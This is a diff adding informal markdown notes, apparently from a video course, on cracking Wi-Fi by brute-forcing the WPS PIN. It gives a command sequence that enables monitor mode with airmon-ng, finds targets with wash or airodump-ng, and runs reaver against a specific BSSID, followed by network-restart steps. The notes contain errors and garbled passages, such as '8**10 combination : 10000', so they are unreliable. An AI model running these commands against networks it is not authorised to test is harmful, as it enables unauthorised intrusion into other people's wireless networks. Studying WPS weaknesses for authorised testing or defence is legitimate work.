@@ -1,0 +1,42 @@
+
+### BruteForce Attack
+It is the trial and error method to decode the encrypted data.
+In wifi hacking it uses 8 digit pin to encrypt the wifi passphrase.
+wps 
+
+braindrop creater reaver 
+use first 4 digit of pin to check if it is correct or not.. then guess randomly other 4 digits. reducing time
+8**10 combination : 10000
+
+flaw: https://en.wikipedia.org/wiki/Wi-Fi_Protected_Setup
+
+
+
+Stepwise methods
+-------------
+Follow the code as mention in the video step by step
+
+> - :~# ifconfig
+> - :~# airmon-ng ---> enable to monitor all traffic received from the wireless network. differet from promiscuous mode often called packet sniffing
+> - :~# airmon-ng start wlan0 --->Enable monitor mode
+> - :~# airmon-ng check ---> checking interfering process
+> - :~# airmon-ng check kill ---> kill all the process
+> - :~# filter hackable network. explaned in previos video. start with time.
+> - :~# wash -i mon0 or airodump-ng wlan0mon,mon0
+> - :~# reaver -i wlan0mon -b C4:E9:84:31:03:C6 -p 29650002  -S -N -vv -K 1//-s sends dh key. cracking speed. -N no nack
+if problem like AP limiting found follow and delay option -p 30 / increase delay time. try testing
+
+
+
+
+
+----------
+
+restart the network
+-------------
+ - /etc/inetd.conf : Internet superserver configuration database
+To restart the network.
+> - :~# airmon-ng stop wlan0mon ---> disable monitor mode
+> - :~# service networking restart
+> - :~# service network-manager restart
+
